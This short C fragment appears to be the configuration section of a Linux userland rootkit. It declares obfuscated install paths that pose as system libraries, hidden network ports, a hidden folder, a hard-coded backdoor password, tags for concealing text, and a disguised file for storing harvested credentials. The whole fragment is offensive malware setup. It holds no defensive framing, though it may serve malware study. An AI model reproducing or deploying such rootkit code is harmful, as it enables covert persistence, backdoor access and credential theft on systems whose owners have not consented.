__attribute__((visibility("hidden"))) char* INSTALL_LOCATIONS[] = {
				AY_OBFUSCATE("/lib/libhtsjava.so.3"), 
				AY_OBFUSCATE("/lib/libsgx_urts.so.1.1"), 
				AY_OBFUSCATE("/lib/libogdi.so.4.1"), 
				AY_OBFUSCATE("/lib64/ld-linux-x86-64.so.3"), 
				AY_OBFUSCATE("/lib/selinux.so.1.1.2")
				};
__attribute__((visibility("hidden"))) int HIDDEN_PORTS[]		= {1337, 1338};
__attribute__((visibility("hidden"))) char* HIDDEN_FOLDERS[]	= {AY_OBFUSCATE("jakhid")};
__attribute__((visibility("hidden"))) char* MAGIC_PASS			= AY_OBFUSCATE("magicpass");
__attribute__((visibility("hidden"))) char* HIDETAG_ENTRY		= AY_OBFUSCATE("obfuscate_start");
__attribute__((visibility("hidden"))) char* HIDETAG_STOP		= AY_OBFUSCATE("obfuscate_stop");
__attribute__((visibility("hidden"))) char* CREDENTIALS_FILE	= AY_OBFUSCATE("/tmp/.X11-logs/creds");
